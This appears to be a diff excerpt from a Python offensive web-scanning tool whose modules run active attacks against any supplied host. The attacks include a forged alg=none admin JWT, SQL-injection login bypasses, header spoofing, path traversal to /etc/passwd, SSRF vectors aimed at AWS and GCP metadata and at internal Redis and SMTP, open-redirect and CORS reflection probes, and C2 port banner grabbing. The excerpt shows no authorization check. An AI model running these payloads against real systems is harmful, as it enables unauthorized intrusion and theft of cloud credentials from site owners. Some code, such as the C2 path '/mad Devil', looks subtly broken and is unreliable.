+   667→            if "httponly" not in set_cookie.lower(): issues.append("missing HttpOnly flag")
+   668→            if "samesite" not in set_cookie.lower(): issues.append("missing SameSite flag")
+   669→            if issues:
+   670→                add(f"Cookie security issues: {', '.join(issues)}", "medium", "cookies",
+   671→                    f"Cookie: {set_cookie[:80]}", "; ".join(issues))
+   672→
+   673→    # 12. WAF detection
+   674→    categories_run.append("WAF Detection")
+   675→    if r["status"]:
+   676→        server = r["headers"].get("server", "").lower()
+   677→        if "cloudflare" in server:
+   678→            add("WAF detected: Cloudflare", "info", "waf", "Cloudflare WAF in front of target", "server: cloudflare")
+   679→        elif "akamai" in server:
+   680→            add("WAF detected: Akamai", "info", "waf", "Akamai WAF", "server: akamai")
+   681→        elif "imperva" in server or "incapsula" in server:
+   682→            add("WAF detected: Imperva/Incapsula", "info", "waf", "Imperva WAF", "server: imperva")
+   683→        else:
+   684→            add("No obvious WAF detected", "low", "waf", "Server header doesn't reveal a WAF", server or "(empty)")
+   685→
+   686→    # 13. JavaScript bundles / framework
+   687→    categories_run.append("JS Framework Fingerprint")
+   688→    if r["status"] and r["body"]:
+   689→        body_lower = r["body"].lower()
+   690→        for fw in ["react", "vue", "angular", "next.js", "__next", "nuxt", "svelte", "ember", "backbone"]:
+   691→            if fw in body_lower:
+   692→                add(f"Frontend framework: {fw}", "info", "framework", f"Signal for {fw} detected", fw)
+   693→
+   694→    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
+   695→    for f in findings:
+   696→        severity_counts[f["severity"]] = severity_counts.get(f["severity"], 0) + 1
+   697→
+   698→    return {
+   699→        "module": "RECON",
+   700→        "categories_run": categories_run,
+   701→        "findings": findings,
+   702→        "total_findings": len(findings),
+   703→        "severity_counts": severity_counts,
+   704→    }
+   705→
+   706→# ══════════════════════════════════════════════════════════════════════════════
+   707→# MODULE 2: AUTH BYPASS — 15 techniques
+   708→# ══════════════════════════════════════════════════════════════════════════════
+   709→
+   710→AUTH_BYPASS_TESTS = [
+   711→    {"id": "AB-001", "name": "JWT None Algorithm", "technique": "Send a JWT signed with alg=none to bypass verification",
+   712→     "payload": lambda h: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."},
+   713→    {"id": "AB-002", "name": "SQL Auth Bypass — admin'--", "technique": "Classic SQL injection in login form",
+   714→     "payload": lambda h: "admin'--"},
+   715→    {"id": "AB-003", "name": "SQL Auth Bypass — ' OR 1=1--", "technique": "Universal SQL auth bypass",
+   716→     "payload": lambda h: "' OR 1=1--"},
+   717→    {"id": "AB-004", "name": "OAuth Redirect URI Bypass", "technique": "Open redirect in OAuth callback",
+   718→     "payload": lambda h: f"https://{h}/oauth/callback?redirect_uri=https://evil.example.com"},
+   719→    {"id": "AB-005", "name": "Authorization Header Bearer Empty", "technique": "Empty bearer token",
+   720→     "payload": lambda h: ""},
+   721→    {"id": "AB-006", "name": "Authorization Header Bearer admin", "technique": "Plain text admin token",
+   722→     "payload": lambda h: "admin"},
+   723→    {"id": "AB-007", "name": "X-Forwarded-For Spoofing", "technique": "Trusted-internal header spoof",
+   724→     "payload": lambda h: "127.0.0.1"},
+   725→    {"id": "AB-008", "name": "X-Original-URL Override", "technique": "IIS/ASP.NET path override",
+   726→     "payload": lambda h: "/admin"},
+   727→    {"id": "AB-009", "name": "Path Traversal to Auth File", "technique": "Read auth config via traversal",
+   728→     "payload": lambda h: "../../etc/passwd"},
+   729→    {"id": "AB-010", "name": "Default Credentials admin/admin", "technique": "Default credential test",
+   730→     "payload": lambda h: "admin:admin"},
+   731→    {"id": "AB-011", "name": "Default Credentials admin/password", "technique": "Default credential test",
+   732→     "payload": lambda h: "admin:password"},
+   733→    {"id": "AB-012", "name": "Weak API Key — sk-test", "technique": "Test API key",
+   734→     "payload": lambda h: "sk-test"},
+   735→    {"id": "AB-013", "name": "Mass Assignment role=admin", "technique": "Mass assignment escalation",
+   736→     "payload": lambda h: '{"role":"admin","isAdmin":true}'},
+   737→    {"id": "AB-014", "name": "HTTP Method Override — X-HTTP-Method-Override", "technique": "Bypass GET restriction",
+   738→     "payload": lambda h: "DELETE"},
+   739→    {"id": "AB-015", "name": "Cookie Auth Bypass — admin=true", "technique": "Client-side role cookie",
+   740→     "payload": lambda h: "admin=true; role=admin"},
+   741→]
+   742→
+   743→def module_auth_bypass(host: str) -> Dict[str, Any]:
+   744→    results = []
+   745→    for t in AUTH_BYPASS_TESTS:
+   746→        payload_val = t["payload"](host)
+   747→        # Test against common auth endpoints
+   748→        for ep in ["/admin", "/api/user", "/v1/user", "/api/me", "/profile"]:
+   749→            url = f"https://{host}{ep}"
+   750→            headers = {}
+   751→            if "JWT" in t["name"]:
+   752→                headers["Authorization"] = f"Bearer {payload_val}"
+   753→            elif "X-Forwarded" in t["name"]:
+   754→                headers["X-Forwarded-For"] = payload_val
+   755→            elif "X-Original-URL" in t["name"]:
+   756→                headers["X-Original-URL"] = payload_val
+   757→            elif "X-HTTP-Method" in t["name"]:
+   758→                headers["X-HTTP-Method-Override"] = payload_val
+   759→            elif "Cookie" in t["name"]:
+   760→                headers["Cookie"] = payload_val
+   761→            elif "Authorization" in t["name"]:
+   762→                headers["Authorization"] = f"Bearer {payload_val}"
+   763→            else:
+   764→                headers["X-Test-Payload"] = payload_val
+   765→            r = http_probe(url, method="GET", headers=headers, timeout=4)
+   766→            # Detect potential bypass: 200/302 instead of 401/403
+   767→            bypass = r["status"] in (200, 301, 302) and r["status"] != 401 and r["status"] != 403
+   768→            results.append({
+   769→                "id": t["id"], "name": t["name"], "technique": t["technique"],
+   770→                "endpoint": ep, "payload": payload_val[:80],
+   771→                "status": r["status"], "bypass_success": bypass,
+   772→                "bodyPreview": r["body"][:120],
+   773→            })
+   774→            if r["status"] == 0:
+   775→                break  # Endpoint likely doesn't exist
+   776→    bypasses = [r for r in results if r["bypass_success"]]
+   777→    return {
+   778→        "module": "AUTH BYPASS",
+   779→        "techniques_tested": len(AUTH_BYPASS_TESTS),
+   780→        "endpoints_per_technique": 5,
+   781→        "total_attempts": len(results),
+   782→        "bypasses_successful": len(bypasses),
+   783→        "results": results,
+   784→        "bypass_findings": bypasses,
+   785→    }
+   786→
+   787→# ══════════════════════════════════════════════════════════════════════════════
+   788→# MODULE 3: CHAIN HUNTER — SSRF + redirect chain analysis
+   789→# ══════════════════════════════════════════════════════════════════════════════
+   790→
+   791→def module_chain_hunter(host: str) -> Dict[str, Any]:
+   792→    """Hunt SSRF and redirect chains."""
+   793→    findings = []
+   794→    chains_tested = 0
+   795→
+   796→    # SSRF test vectors
+   797→    ssrf_vectors = [
+   798→        {"id": "CH-001", "name": "Internal IP SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/fetch"},
+   799→        {"id": "CH-002", "name": "AWS Metadata SSRF", "vector": "http://169.254.169.254/latest/meta-data/", "endpoint": "/api/fetch"},
+   800→        {"id": "CH-003", "name": "GCP Metadata SSRF", "vector": "http://metadata.google.internal/computeMetadata/v1/", "endpoint": "/api/fetch"},
+   801→        {"id": "CH-004", "name": "Cloudflare Metadata SSRF", "vector": "http://169.254.169.254/cdn-cgi/trace", "endpoint": "/api/fetch"},
+   802→        {"id": "CH-005", "name": "File Protocol SSRF", "vector": "file:///etc/passwd", "endpoint": "/api/fetch"},
+   803→        {"id": "CH-006", "name": "Gopher Protocol SSRF", "vector": "gopher://127.0.0.1:25/_HELO%20test", "endpoint": "/api/fetch"},
+   804→        {"id": "CH-007", "name": "DNS Rebinding SSRF", "vector": "http://rebind.example.com", "endpoint": "/api/fetch"},
+   805→        {"id": "CH-008", "name": "Internal Service SSRF", "vector": "http://localhost:6379/", "endpoint": "/api/fetch"},
+   806→        {"id": "CH-009", "name": "Redirect to Internal", "vector": f"https://{host}/redirect?url=http://127.0.0.1", "endpoint": "/redirect"},
+   807→        {"id": "CH-010", "name": "URL Parameter SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/proxy"},
+   808→    ]
+   809→
+   810→    # Common SSRF parameters
+   811→    ssrf_params = ["url", "target", "uri", "fetch", "next", "redirect", "redirectUrl", "redirect_uri",
+   812→                   "callback", "proxy", "src", "source", "image", "img", "file", "load"]
+   813→
+   814→    # Probe SSRF endpoints
+   815→    for sv in ssrf_vectors:
+   816→        chains_tested += 1
+   817→        for param in ssrf_params[:3]:  # test 3 params per vector
+   818→            url = f"https://{host}{sv['endpoint']}?{param}={urllib.parse.quote(sv['vector'], safe='')}"
+   819→            r = http_probe(url, timeout=5)
+   820→            # Detect SSRF: response contains internal content
+   821→            internal_signals = ["root:x:" in r["body"], "instance-id" in r["body"],
+   822→                                "ami-id" in r["body"], "computeMetadata" in r["body"],
+   823→                                "cdn-cgi" in r["body"], "redis" in r["body"].lower()]
+   824→            ssrf_hit = any(internal_signals) or (r["status"] == 200 and len(r["body"]) > 100 and
+   825→                                                  any(s in r["body"][:200] for s in ["root", "instance", "metadata"]))
+   826→            findings.append({
+   827→                "id": sv["id"], "name": sv["name"], "vector": sv["vector"],
+   828→                "endpoint": sv["endpoint"], "param": param,
+   829→                "status": r["status"], "ssrf_detected": ssrf_hit,
+   830→                "bodyPreview": r["body"][:120],
+   831→            })
+   832→            if r["status"] == 0:
+   833→                break
+   834→
+   835→    # Redirect chain analysis
+   836→    chains_tested += 1
+   837→    redirect_chains = []
+   838→    for path in ["/", "/login", "/admin", "/api", "/redirect"]:
+   839→        url = f"https://{host}{path}"
+   840→        r = http_probe(url, timeout=4)
+   841→        if r["status"] in (301, 302, 303, 307, 308):
+   842→            location = r["headers"].get("location", "")
+   843→            redirect_chains.append({
+   844→                "start": path, "status": r["status"], "redirects_to": location,
+   845→                "open_redirect": "evil" in location.lower() or "//" in location[:8],
+   846→            })
+   847→
+   848→    return {
+   849→        "module": "CHAIN HUNTER",
+   850→        "chains_tested": chains_tested,
+   851→        "ssrf_vectors": len(ssrf_vectors),
+   852→        "findings": findings,
+   853→        "ssrf_detected": len([f for f in findings if f["ssrf_detected"]]),
+   854→        "redirect_chains": redirect_chains,
+   855→        "open_redirects": len([c for c in redirect_chains if c["open_redirect"]]),
+   856→    }
+   857→
+   858→# ══════════════════════════════════════════════════════════════════════════════
+   859→# MODULE 4: BOT HUNTER — C2 / bot infrastructure detection
+   860→# ══════════════════════════════════════════════════════════════════════════════
+   861→
+   862→BOT_SIGNATURES = [
+   863→    {"name": "Mirai C2", "ports": [23, 2323, 7547], "banner": ["mirai", "bot"]},
+   864→    {"name": "Cobalt Strike", "ports": [443, 80, 8080], "banner": ["cobalt", "beacon", "strike"]},
+   865→    {"name": "Metasploit", "ports": [4444, 8443], "banner": ["meterpreter", "msfconsole"]},
+   866→    {"name": "Emotet", "ports": [8080, 443], "banner": ["emotet"]},
+   867→    {"name": "TrickBot", "ports": [447, 808], "banner": ["trickbot"]},
+   868→    {"name": "QakBot", "ports": [8080, 443], "banner": ["qakbot", "qbot"]},
+   869→    {"name": "SolarWinds SUNBURST", "ports": [443], "banner": ["sunburst", "solarwinds"]},
+   870→    {"name": "Log4Shell", "ports": [443, 80, 389], "banner": ["jndi:ldap", "jndi:rmi"]},
+   871→    {"name": "AsyncRAT", "ports": [6666, 7777], "banner": ["asyncrat"]},
+   872→    {"name": "njRAT", "ports": [1177, 5552], "banner": ["njrat"]},
+   873→]
+   874→
+   875→def module_bot_hunter(host: str) -> Dict[str, Any]:
+   876→    """Hunt for C2 / bot infrastructure on the target."""
+   877→    detections = []
+   878→    # Resolve host
+   879→    try:
+   880→        ip = socket.gethostbyname(host)
+   881→    except Exception as e:
+   882→        audit_log("bot.resolve.error", status=type(e).__name__, detail=str(e)[:120])
+   883→        ip = host
+   884→
+   885→    # Probe each signature
+   886→    for sig in BOT_SIGNATURES:
+   887→        for port in sig["ports"]:
+   888→            try:
+   889→                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   890→                s.settimeout(2)
+   891→                if s.connect_ex((ip, port)) == 0:
+   892→                    # Try to grab banner
+   893→                    try:
+   894→                        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
+   895→                        banner = s.recv(512).decode("utf-8", errors="replace").lower()
+   896→                    except Exception:
+   897→                        banner = ""
+   898→                    detected = any(b in banner for b in sig["banner"])
+   899→                    detections.append({
+   900→                        "signature": sig["name"], "port": port, "open": True,
+   901→                        "banner_snippet": banner[:80],
+   902→                        "bot_detected": detected,
+   903→                    })
+   904→                s.close()
+   905→            except Exception as e:
+   906→                audit_log("bot.probe.error", status=type(e).__name__, detail=f"{sig['name']}:{port} {str(e)[:80]}")
+   907→
+   908→    # Check for known C2 paths
+   909→    c2_paths = ["/beacon", "/c2", "/panel", "/gate.php", "/cmd.php", "/mad Devil", "/login.php",
+   910→                "/bot/checkin", "/api/bot", "/control"]
+   911→    for path in c2_paths:
+   912→        url = f"https://{host}{path}"
+   913→        r = http_probe(url, timeout=4)
+   914→        if r["status"] not in (0, 404) and r["status"] < 500:
+   915→            detections.append({
+   916→                "signature": "C2 Path Probe", "path": path, "status": r["status"],
+   917→                "body_snippet": r["body"][:80],
+   918→                "bot_detected": r["status"] == 200,
+   919→            })
+   920→
+   921→    bot_hits = [d for d in detections if d.get("bot_detected")]
+   922→    return {
+   923→        "module": "BOT HUNTER",
+   924→        "signatures_tested": len(BOT_SIGNATURES),
+   925→        "paths_probed": len(c2_paths),
+   926→        "detections": detections,
+   927→        "total_detections": len(detections),
+   928→        "bot_hits": len(bot_hits),
+   929→        "bot_findings": bot_hits,
+   930→    }
+   931→
+   932→# ══════════════════════════════════════════════════════════════════════════════
+   933→# MODULE 5 + 6: GORGON + OBLIVION (import from sibling modules)
+   934→# ══════════════════════════════════════════════════════════════════════════════
+   935→
+   936→CACHE_DIR = "/home/z/my-project/download"
+   937→
+   938→# ── Filename safety (m4) ────────────────────────────────────────────────────
+   939→_FILENAME_UNSAFE_RE = re.compile(r'[\x00-\x1f\x7f\x80-\x9f/\\:\n\r\t]')
+   940→_FILENAME_MAX_LEN = 120
+   941→
+   942→def _safe_filename(raw: str) -> str:
+   943→    """Sanitize a user-supplied string for use as a filename component.
+   944→
+   945→    Strips: null bytes, control chars, path separators, backslashes.
+   946→    Truncates to _FILENAME_MAX_LEN. Rejects empty results (returns 'unnamed').
+   947→    """
+   948→    cleaned = _FILENAME_UNSAFE_RE.sub('_', raw)
+   949→    # Collapse consecutive underscores
+   950→    cleaned = re.sub(r'_{2,}', '_', cleaned)
+   951→    cleaned = cleaned.strip('._-')
+   952→    cleaned = cleaned[:_FILENAME_MAX_LEN]
+   953→    if not cleaned or cleaned in ('.', '..'):
+   954→        return 'unnamed'
+   955→    return cleaned
+   956→
+   957→def _find_cache(prefix: str, host: str) -> Optional[str]:
+   958→    """Find a cached JSON for this host with the given prefix."""
+   959→    if not os.path.isdir(CACHE_DIR):
+   960→        return None
+   961→    safe = _safe_filename(host)
+   962→    candidates = [
+   963→        f"{CACHE_DIR}/{prefix}_{safe}.json",
+   964→        f"{CACHE_DIR}/{prefix}_{safe}_v2.json",
+   965→    ]
+   966→    # also any *{host}*.json
+   967→    for f in sorted(os.listdir(CACHE_DIR), reverse=True):
+   968→        if f.startswith(prefix) and safe in f and f.endswith(".json"):
+   969→            candidates.append(f"{CACHE_DIR}/{f}")
+   970→    for c in candidates:
+   971→        if os.path.exists(c) and os.path.getsize(c) > 100:
+   972→            return c
+   973→    return None
+   974→
+   975→def module_gorgon(host: str) -> Dict[str, Any]:
+   976→    """Run GORGON ULTRA — uses cache if available, otherwise in-process call."""
+   977→    # 1. Try cache
+   978→    cached = _find_cache("gorgon", host) or _find_cache("model_breaker", host)
+   979→    if cached:
+   980→        try:
+   981→            with open(cached) as f:
+   982→                data = json.load(f)
+   983→            data["_cached_from"] = cached
+   984→            return data
+   985→        except Exception as e:
+   986→            audit_log("gorgon.cache_read.error", status=type(e).__name__, detail=str(e)[:120])
+   987→    # 2. In-process import
+   988→    sys.path.insert(0, "/home/z/my-project/scripts")
+   989→    try:
+   990→        import model_breaker
+   991→        if hasattr(model_breaker, "run_gorgon_scan"):
+   992→            return model_breaker.run_gorgon_scan(host)
+   993→    except Exception as e:
+   994→        audit_log("gorgon.import.error", status=type(e).__name__, detail=str(e)[:120])
+   995→    # 3. Subprocess fallback
+   996→    import subprocess as sp
+   997→    try:
+   998→        out_file = f"/tmp/gorgon_{_safe_filename(host)}.json"
+   999→        r = sp.run(["python3", "/home/z/my-project/scripts/model_breaker.py", host, "-o", out_file],
+  1000→                   capture_output=True, text=True, timeout=180)
+  1001→        if os.path.exists(out_file):
+  1002→            with open(out_file) as f:
+  1003→                return json.load(f)
+  1004→    except Exception as e:
+  1005→        return {"module": "GORGON ULTRA", "error": str(e)}
+  1006→    return {"module": "GORGON ULTRA", "error": "no output"}
+  1007→
+  1008→def module_oblivion(host: str) -> Dict[str, Any]:
+  1009→    """Run OBLIVION — uses cache if available, otherwise in-process call."""
+  1010→    # 1. Try cache
+  1011→    cached = _find_cache("oblivion", host)
+  1012→    if cached:
+  1013→        try:
+  1014→            with open(cached) as f:
+  1015→                data = json.load(f)
+  1016→            data["_cached_from"] = cached
+  1017→            return data
+  1018→        except Exception as e:
+  1019→            audit_log("oblivion.cache_read.error", status=type(e).__name__, detail=str(e)[:120])
+  1020→    # 2. In-process import
+  1021→    sys.path.insert(0, "/home/z/my-project/scripts")
+  1022→    try:
+  1023→        import oblivion
+  1024→        if hasattr(oblivion, "run_oblivion"):
+  1025→            return oblivion.run_oblivion(host)
+  1026→    except Exception as e:
+  1027→        audit_log("oblivion.import.error", status=type(e).__name__, detail=str(e)[:120])
+  1028→    # 3. Subprocess fallback
+  1029→    import subprocess as sp
+  1030→    try:
+  1031→        out_file = f"/tmp/oblivion_{_safe_filename(host)}.json"
+  1032→        r = sp.run(["python3", "/home/z/my-project/scripts/oblivion.py", host, "-o", out_file],
+  1033→                   capture_output=True, text=True, timeout=240)
+  1034→        if os.path.exists(out_file):
+  1035→            with open(out_file) as f:
+  1036→                return json.load(f)
+  1037→    except Exception as e:
+  1038→        return {"module": "OBLIVION", "error": str(e)}
+  1039→    return {"module": "OBLIVION", "error": "no output"}
+  1040→
+  1041→# ══════════════════════════════════════════════════════════════════════════════
+  1042→# MODULE 7: VIBESEC — AI/Vibe-Coding Vulnerability Benchmark
+  1043→# ══════════════════════════════════════════════════════════════════════════════
+  1044→
+  1045→def _vibesec_compute_grade(score: int) -> Tuple[str, str]:
+  1046→    """Map a 0-100 score to a letter grade and rich color."""
+  1047→    for threshold, grade, color in VIBESEC_GRADE_MAP:
+  1048→        if score >= threshold:
+  1049→            return grade, color
+  1050→    return "F", "bold bright_red"
+  1051→
+  1052→
+  1053→def _vibesec_render_badge(target: str, grade: str, score: int) -> str:
+  1054→    """Generate a Markdown badge snippet for GitHub READMEs."""
+  1055→    color_map = {"A+": "brightgreen", "A": "green", "B": "yellow", "C": "red", "D": "orange", "F": "red"}
+  1056→    badge_color = color_map.get(grade, "lightgrey")
+  1057→    return f'![VibeSec Grade {grade}](https://img.shields.io/badge/VibeSec-{grade}-{badge_color}?style=for-the-badge&labelColor=0B1C2C)'
+  1058→
+  1059→
+  1060→def module_vibesec(host: str) -> Dict[str, Any]:
+  1061→    """Rapid AI/vibe-coding vulnerability benchmark.
+  1062→
+  1063→    Checks four categories:
+  1064→      1. Exposed env/config endpoints
+  1065→      2. Unauthenticated API/webhook routes
+  1066→      3. Permissive CORS policies
+  1067→      4. Exposed anon/public backend keys (Supabase, Firebase, S3, R2)
+  1068→
+  1069→    Returns a 100-point VibeSec score with A+ to F grade mapping.
+  1070→    Every finding is verified via native HTTP response validation (zero fabrication).
+  1071→    """
+  1072→    findings: List[Dict[str, Any]] = []
+  1073→    deductions = 0  # each vulnerability deducts from 100
+  1074→
+  1075→    base_url = host if host.startswith("http") else f"https://{host}"
+  1076→
+  1077→    def add(title, severity, category, description, evidence, points_deducted):
+  1078→        nonlocal deductions
+  1079→        deductions += points_deducted
+  1080→        findings.append({
+  1081→            "title": title, "severity": severity, "category": category,
+  1082→            "description": description, "evidence": evidence, "asset": host,
+  1083→            "points_deducted": points_deducted,
+  1084→        })
+  1085→
+  1086→    # ── Category 1: Exposed Environment/Config Files ──────────────────────
+  1087→    audit_log("vibesec.config.start", detail=host)
+  1088→    for path in VIBESEC_SENSITIVE_PATHS:
+  1089→        url = base_url.rstrip("/") + path
+  1090→        resp = http_probe(url, timeout=5)
+  1091→        status = resp.get("status", 0)
+  1092→        body = resp.get("body", "")[:2048]
+  1093→        if status == 200 and len(body) > 10:
+  1094→            # Verify: real content, not just a redirect page
+  1095→            has_secrets = any(kw in body.lower() for kw in [
+  1096→                "api_key", "secret", "password", "token", "database_url",
+  1097→                "private_key", "supabase", "firebase", "aws_access",
+  1098→            ])
+  1099→            if has_secrets:
+  1100→                add(f"Exposed config — {path}", "critical", "exposed_config",
+  1101→                    f"Sensitive configuration endpoint accessible: {path} (200 OK, {len(body)} bytes, contains secrets)",
+  1102→                    f"GET {path} → {status} ({len(body)}B, secrets detected)", 15)
+  1103→            else:
+  1104→                add(f"Exposed config — {path}", "high", "exposed_config",
+  1105→                    f"Configuration endpoint accessible: {path} (200 OK, {len(body)} bytes)",
+  1106→                    f"GET {path} → {status} ({len(body)}B)", 10)
+  1107→        elif status in (200, 201, 301, 302, 307, 308) and status != 404:
+  1108→            add(f"Config path accessible — {path}", "medium", "exposed_config",
+  1109→                f"Endpoint returned {status} (may redirect or serve partial content)",
+  1110→                f"GET {path} → {status}", 5)
+  1111→    audit_log("vibesec.config.done", detail=f"{len([f for f in findings if f['category'] == 'exposed_config'])} findings")
+  1112→
+  1113→    # ── Category 2: Unauthenticated API/Webhook Routes ────────────────────
+  1114→    audit_log("vibesec.api.start", detail=host)
+  1115→    for path in VIBESEC_API_PATHS:
+  1116→        url = base_url.rstrip("/") + path
+  1117→        resp = http_probe(url, timeout=5)
+  1118→        status = resp.get("status", 0)
+  1119→        body = resp.get("body", "")[:2048]
+  1120→        if status == 200:
+  1121→            # Check for auth-required indicators
+  1122→            body_lower = body.lower()
+  1123→            is_protected = any(kw in body_lower for kw in [
+  1124→                "unauthorized", "401", "forbidden", "authentication required",
+  1125→                "\"error\"", "login required",
+  1126→            ])
+  1127→            if not is_protected and len(body) > 20:
+  1128→                add(f"Unauthenticated API — {path}", "high", "unauth_api",
+  1129→                    f"API route accessible without authentication: {path} (200 OK, {len(body)} bytes)",
+  1130→                    f"GET {path} → {status} (no auth required)", 10)
+  1131→            elif status == 200:
+  1132→                add(f"API route reachable — {path}", "medium", "unauth_api",
+  1133→                    f"API route returned 200 but may have auth checks in POST/DELETE",
+  1134→                    f"GET {path} → {status}", 5)
+  1135→        elif status in (403, 401):
+  1136→            pass  # properly protected — no finding
+  1137→        elif status == 404:
+  1138→            pass  # not found — no finding
+  1139→        elif status == 405:
+  1140→            add(f"API route exists — {path}", "low", "unauth_api",
+  1141→                f"API route exists (405 Method Not Allowed) — may be exploitable with correct method",
+  1142→                f"GET {path} → 405", 3)
+  1143→    audit_log("vibesec.api.done", detail=f"{len([f for f in findings if f['category'] == 'unauth_api'])} findings")
+  1144→
+  1145→    # ── Category 3: CORS Policy Analysis ────────────────────────────────────
+  1146→    audit_log("vibesec.cors.start", detail=host)
+  1147→    # Test with an origin probe
+  1148→    cors_resp = http_probe(base_url, timeout=5)
+  1149→    cors_headers = cors_resp.get("headers", {})
+  1150→    acao = cors_headers.get("Access-Control-Allow-Origin", "")
+  1151→    if acao == "*":
+  1152→        add("Permissive CORS — wildcard origin", "high", "cors",
+  1153→            "Access-Control-Allow-Origin: * — any domain can make cross-origin requests",
+  1154→            f"CORS header: {acao}", 12)
+  1155→    elif acao and acao != "null":
+  1156→        # Specific origin — check if it reflects the Origin header
+  1157→        reflect_resp = http_probe(base_url, headers={"Origin": "https://evil-attacker.com"}, timeout=5)
+  1158→        reflected = reflect_resp.get("headers", {}).get("Access-Control-Allow-Origin", "")
+  1159→        if "evil-attacker" in reflected:
+  1160→            add("CORS origin reflection vulnerability", "critical", "cors",
+  1161→                "Server reflects any Origin header back — allows cross-origin attacks from any domain",
+  1162→                f"Sent Origin: https://evil-attacker.com, got back: {reflected}", 15)
+  1163→    allow_cred = cors_headers.get("Access-Control-Allow-Credentials", "")
+  1164→    if acao != "" and allow_cred.lower() == "true":
+  1165→        add("CORS credentials exposed", "high", "cors",
+  1166→            "Access-Control-Allow-Credentials: true with non-empty Allow-Origin",
+  1167→            f"Allow-Credentials: true, Allow-Origin: {acao or '(reflected)'}", 10)
+  1168→    if not acao:
+  1169→        # No CORS header at all — check if it's a JSON API that should have CORS
+  1170→        ct = cors_headers.get("content-type", "")
+  1171→        if "json" in ct.lower():
+  1172→            add("JSON API without CORS headers", "low", "cors",
+  1173→                "API returns JSON but sets no CORS headers — may be intentional or oversight",
+  1174→            f"Content-Type: {ct}, no CORS headers", 3)
+  1175→    audit_log("vibesec.cors.done", detail=f"{len([f for f in findings if f['category'] == 'cors'])} findings")
+  1176→
+  1177→    # ── Category 4: Exposed Anon/Public Backend Keys ────────────────────────
+  1178→    audit_log("vibesec.anon_keys.start", detail=host)
+  1179→    # Check the main page body for exposed service URLs
+  1180→    main_body = http_probe(base_url, timeout=5).get("body", "")[:16384]
+  1181→    for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
+  1182→        matches = pattern.findall(main_body)
+  1183→        if matches:
+  1184→            unique = list(set(matches))[:5]
+  1185→            # Verify each match resolves (zero fabrication)
+  1186→            verified = []
+  1187→            for m in unique:
+  1188→                test_url = f"https://{m}" if not m.startswith("http") else m
+  1189→                probe = http_probe(test_url, timeout=3)
+  1190→                if probe.get("status", 0) > 0:
+  1191→                    verified.append(m)
+  1192→            if verified:
+  1193→                add(f"Exposed {name} backend — {len(verified)} instance(s)", "critical", "anon_keys",
+  1194→                    f"Public {name} URLs found in page source and confirmed reachable",
+  1195→                    f"{name}: {', '.join(verified[:3])}", 15)
+  1196→            else:
+  1197→                add(f"Detected {name} references — not verified", "medium", "anon_keys",
+  1198→                    f"{name} URLs found in page source but could not confirm reachability",
+  1199→                    f"{name}: {', '.join(unique[:3])}", 5)
+  1200→
+  1201→    # Also check robots.txt and sitemap for exposed service URLs
+  1202→    for check_path in ["/robots.txt", "/sitemap.xml"]:
+  1203→        check_resp = http_probe(base_url.rstrip("/") + check_path, timeout=5)
+  1204→        if check_resp.get("status") == 200:
+  1205→            check_body = check_resp.get("body", "")[:8192]
+  1206→            for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
+  1207→                matches = pattern.findall(check_body)
+  1208→                if matches and not any(f["title"].startswith(f"Exposed {name}") for f in findings):
+  1209→                    unique = list(set(matches))[:3]
+  1210→                    add(f"{name} URLs in {check_path}", "medium", "anon_keys",
+  1211→                        f"Public {name} URLs exposed in {check_path}",
+  1212→                        f"{check_path}: {', '.join(unique)}", 5)
+  1213→    audit_log("vibesec.anon_keys.done", detail=f"{len([f for f in findings if f['category'] == 'anon_keys'])} findings")
+  1214→
+  1215→    # ── Score Calculation ──────────────────────────────────────────────────
+  1216→    raw_score = max(0, 100 - deductions)
+  1217→    # Normalize: if no findings at all, perfect score
+  1218→    if not findings:
+  1219→        raw_score = 100
+  1220→    # Clamp
+  1221→    raw_score = min(100, max(0, raw_score))
+  1222→    grade, grade_color = _vibesec_compute_grade(raw_score)
+  1223→    badge_md = _vibesec_render_badge(host, grade, raw_score)
+  1224→
+  1225→    severity_counts: Dict[str, int] = {}
+  1226→    for f in findings:
+  1227→        sev = f["severity"]
+  1228→        severity_counts[sev] = severity_counts.get(sev, 0) + 1
+  1229→
+  1230→    result = {
+  1231→        "module": "VIBESEC",
+  1232→        "vibesec_score": raw_score,
+  1233→        "grade": grade,
+  1234→        "grade_color": grade_color,
+  1235→        "badge_markdown": badge_md,
+  1236→        "total_findings": len(findings),
+  1237→        "severity_counts": severity_counts,
+  1238→        "findings": findings,
+  1239→        "categories_checked": ["exposed_config", "unauth_api", "cors", "anon_keys"],
+  1240→        "max_possible_score": 100,
+  1241→    }
+  1242→    audit_log("vibesec.complete", detail=f"score={raw_score} grade={grade} findings={len(findings)}")
+  1243→    return result
+  1244→
+  1245→
+  1246→def render_vibesec_panel(vibesec: Dict[str, Any]) -> None:
+  1247→    """Render VibeSec results as a Rich panel with grade, table, and badge."""
+  1248→    score = vibesec.get("vibesec_score", 0)
+  1249→    grade = vibesec.get("grade", "F")
+  1250→    grade_color = vibesec.get("grade_color", "bold bright_red")
+  1251→    total = vibesec.get("total_findings", 0)
+  1252→    sc = vibesec.get("severity_counts", {})
+  1253→
+  1254→    # Score bar
+  1255→    bar_width = 40
+  1256→    filled = int(score / 100 * bar_width)
+  1257→    bar = "█" * filled + "░" * (bar_width - filled)
+  1258→
+  1259→    console.print(Panel(
+  1260→        Group(
+  1261→            Text("\n  VIBESEC BENCHMARK — AI/Vibe-Coding Vulnerability Audit", style="bold bright_green"),
+  1262→            Text(f""),
+  1263→            Text(f"  Score: {bar} [bold {grade_color}]{score}/100 ({grade})[/{grade_color}]", style="white"),
+  1264→            Text(f""),
+  1265→            Text(f"  Findings: [bold]{total}[/]  "
+  1266→                 f"[bright_red]{sc.get('critical',0)} critical[/], "
+  1267→                 f"[red]{sc.get('high',0)} high[/], "
+  1268→                 f"[yellow]{sc.get('medium',0)} medium[/], "
+  1269→                 f"[green]{sc.get('low',0)} low[/], "
+  1270→                 f"[dim]{sc.get('info',0)} info[/]"),
+  1271→        ),
+  1272→        border_style="bright_green",
+  1273→        title="[bold]VIBESEC[/bold]",
+  1274→        title_align="left",
+  1275→        padding=(1, 2),
+  1276→    ))
+  1277→
